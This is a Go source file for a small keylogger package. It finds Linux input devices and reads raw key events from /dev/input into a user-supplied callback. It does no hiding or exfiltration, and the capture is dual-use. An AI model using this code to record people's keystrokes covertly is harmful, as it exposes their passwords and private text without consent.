// Package keylogger is a simple 0 dependency keylogger package
package keylogger

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"os"
)

const (
	inputPath  = "/sys/class/input/event%d/device/uevent"
	deviceFile = "/dev/input/event%d"
)

// KeyLogger keeps a reference to the InputDevice that it's listening to
type KeyLogger struct {
	inputDevices []*InputDevice
}

// GetDevices gets the desired input device, or returns all of them if no device name is sent
func GetDevices(deviceName string) []*InputDevice {
	var devs []*InputDevice

	for i := 0; i < 255; i++ {
		// TODO check if file exists first
		buff, err := ioutil.ReadFile(fmt.Sprintf(inputPath, i))
		if err != nil {
			// TODO handle this error better
			break
		}
		dev := newInputDevice(buff, i)
		if deviceName == "" || deviceName != "" && deviceName == dev.Name {
			devs = append(devs, dev)
		}
	}

	return devs
}

// NewKeyLogger creates a new keylogger for a device, based on it's name
func NewKeyLogger(deviceName string) *KeyLogger {
	devs := GetDevices(deviceName)
	return &KeyLogger{
		inputDevices: devs,
	}
}

// Read starts logging the input events of the devices in the KeyLogger
func (kl *KeyLogger) Read(fn func(InputEvent)) error {
	for _, dev := range kl.inputDevices {
		fd, err := os.Open(fmt.Sprintf(deviceFile, dev.ID))
		if err != nil {
			return fmt.Errorf("error opening device file: %v", err)
		}

		go func() {
			tmp := make([]byte, eventSize)
			event := InputEvent{}
			for {
				n, err := fd.Read(tmp)
				if err != nil {
					panic(err) // don't think this is right here
				}
				if n <= 0 {
					continue
				}

				if err := binary.Read(bytes.NewBuffer(tmp), binary.LittleEndian, &event); err != nil {
					panic(err) // again, not right
				}

				fn(event)
			}
		}()

	}
	return nil
}
